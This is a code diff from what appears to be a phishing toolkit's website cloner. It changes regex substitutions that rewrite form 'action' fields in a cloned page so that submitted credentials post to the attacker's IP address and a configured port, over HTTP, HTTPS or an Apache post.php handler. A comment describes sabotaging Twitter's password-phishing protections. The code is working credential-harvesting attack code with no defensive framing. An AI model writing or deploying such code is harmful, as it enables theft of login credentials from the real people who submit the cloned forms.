@@ -74,18 +74,19 @@ for line in fileopen:
         # regex for now, can probably use htmlparser later, but right not what its doing is
         # replacing any url on the "action" field with your victim IP which will have a custom
         # web server running to post the data to your site
+        web_port = str(check_config("WEB_PORT="))
         if ssl_flag == 'false':
             line = re.sub(
-                'action="http?\w://[\w.\?=/&]*/', 'action="http://%s/' % (ipaddr), line)
+                'action="http?\w://[\w.\?=/&]*/', 'action="http://%s:%s/' % (ipaddr, web_port), line)
             if apache_mode == "on":
                 line = re.sub(
-                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
+                    'action="*"', 'action="http://%s:%s/post.php"' % (ipaddr, web_port), line)
         if ssl_flag == 'true':
             line = re.sub(
-                'action="http?\w://[\w.\?=/&]*/', 'action="https://%s/' % (ipaddr), line)
+                'action="http?\w://[\w.\?=/&]*/', 'action="https://%s:%s/' % (ipaddr, web_port), line)
             if apache_mode == "on":
                 line = re.sub(
-                    'action="*"', 'action="http://%s/post.php"' % (ipaddr), line)
+                    'action="*"', 'action="http://%s:%s/post.php"' % (ipaddr, web_port), line)
 
     # this is if twitter is in use, we rename a function name to something
     # garbage to remove password phishing restrictions
